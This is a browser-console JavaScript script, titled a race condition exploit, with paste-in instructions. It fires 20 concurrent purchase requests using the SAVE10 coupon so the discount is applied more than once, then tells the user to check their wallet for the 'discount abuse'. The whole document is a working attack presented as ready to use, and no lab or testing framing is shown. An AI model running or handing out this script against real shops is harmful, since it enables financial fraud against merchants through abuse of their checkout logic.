/**
 * Browser Console Race Condition Exploit
 * ======================================
 * 
 * Instructions:
 * 1. Add items to cart and apply SAVE10 coupon
 * 2. Go to checkout page (but DON'T click purchase yet)
 * 3. Open browser Developer Tools (F12)
 * 4. Go to Console tab
 * 5. Paste this entire script and press Enter
 * 6. The script will automatically exploit the race condition
 * 
 * This will send multiple concurrent purchase requests to abuse the coupon.
 */

console.log("üöÄ Starting Race Condition Coupon Exploit...");

// Function to create purchase request
function sendPurchaseRequest(index) {
    return fetch('/purchase', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'XMLHttpRequest'
        },
        body: 'coupon_code=SAVE10',
        credentials: 'same-origin'
    }).then(response => {
        console.log(`üéØ Request ${index}: HTTP ${response.status}`);
        return {
            index: index,
            status: response.status,
            success: response.status === 200 || response.status === 302
        };
    }).catch(error => {
        console.log(`‚ùå Request ${index}: Error - ${error.message}`);
        return {
            index: index,
            error: error.message,
            success: false
        };
    });
}

// Launch race condition attack with 20 concurrent requests
console.log("üèÅ Launching 20 concurrent coupon requests...");

const promises = [];
for (let i = 1; i <= 20; i++) {
    promises.push(sendPurchaseRequest(i));
}

// Wait for all requests to complete
Promise.all(promises).then(results => {
    const successful = results.filter(r => r.success).length;
    const failed = results.filter(r => !r.success).length;
    
    console.log(`\nüìä Race Condition Results:`);
    console.log(`   Successful requests: ${successful}`);
    console.log(`   Failed requests: ${failed}`);
    
    if (successful > 1) {
        console.log(`üö® RACE CONDITION EXPLOITED!`);
        console.log(`   Multiple coupon applications likely occurred!`);
        console.log(`   Check your wallet balance for the discount abuse.`);
    } else {
        console.log(`‚ÑπÔ∏è  Race condition may not have worked. Try again.`);
    }
    
    // Reload page to see results
    setTimeout(() => {
        window.location.reload();
    }, 2000);
});

console.log("‚è≥ Waiting for concurrent requests to complete...");
